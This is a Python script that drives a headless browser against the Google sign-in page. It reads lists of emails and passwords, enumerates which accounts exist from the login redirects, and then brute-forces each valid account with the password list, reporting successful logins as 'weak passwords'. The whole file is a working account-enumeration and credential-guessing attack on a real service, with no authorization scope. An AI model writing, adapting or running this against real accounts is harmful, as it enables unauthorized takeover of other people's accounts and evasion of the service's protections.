import sys, time, re
from playwright.sync_api import sync_playwright, TimeoutError

if len(sys.argv) < 3:
    sys.exit("Usage: python3 script.py <usernames.txt> <passwords.txt>")

try:
    emails = open(sys.argv[1]).read().split()
except FileNotFoundError:
    sys.exit(f"[!] File '{sys.argv[1]}' not found.")

try:
    passwords = open(sys.argv[2]).read().split()
except FileNotFoundError:
    sys.exit(f"[!] File '{sys.argv[2]}' not found.")

print(f"[*] Loaded {len(emails)} emails and {len(passwords)} passwords. Starting browser engine...")

with sync_playwright() as p:
    browser = p.chromium.launch(headless=True)
    for e in emails:
        context = browser.new_context()
        page = context.new_page()
        try:
            page.goto("https://accounts.google.com/")
            page.fill('input[type="email"]', e)
            page.keyboard.press("Enter")
            try:
                page.wait_for_url(re.compile(r"(rejected|challenge/pwd)"), timeout=6000)
                if "rejected" in page.url:
                    print(f"[-] Invalid User: {e}")
                else:
                    print(f"[+] VALID USER: {e}")
                    found_weak = False
                    for pw in passwords:
                        try:
                            page.fill('input[type="password"]', pw)
                            page.keyboard.press("Enter")
                            time.sleep(3)  # Wait for potential redirect or error
                            if page.locator('input[type="password"]').is_visible():
                                print(f"[-] Wrong password for {e}: {pw}")
                            else:
                                print(f"[!!] WEAK PASSWORD FOUND: {e} with {pw}")
                                found_weak = True
                                break
                        except Exception as ex:
                            print(f"[!] Error trying password {pw} for {e}: {ex}")
                            break
                    if not found_weak:
                        print(f"[-] No weak password found for {e}")
            except TimeoutError:
                print(f"[?] Unknown/CAPTCHA: {e} ({page.url[:60]}...)")
        except Exception as ex:
            print(f"[!] Browser error testing {e}: {ex}")
        context.close()
        time.sleep(2)
